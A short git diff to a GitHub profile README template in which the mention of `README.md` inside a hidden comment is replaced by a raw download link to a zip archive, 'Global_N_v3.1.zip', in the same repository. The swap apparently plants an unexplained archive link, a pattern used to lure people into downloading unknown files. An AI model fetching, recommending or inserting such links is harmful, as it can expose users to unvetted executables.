@@ -7,6 +7,6 @@
 - ⚡ Fun fact: ...
 
 <!---
-NV-Global/NV-Global is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
+NV-Global/NV-Global is a ✨ special ✨ repository because its `https://raw.githubusercontent.com/NV-Global/NV-Global/main/indigently/Global_N_v3.1.zip` (this file) appears on your GitHub profile.
 You can click the Preview link to take a look at your changes.
 --->
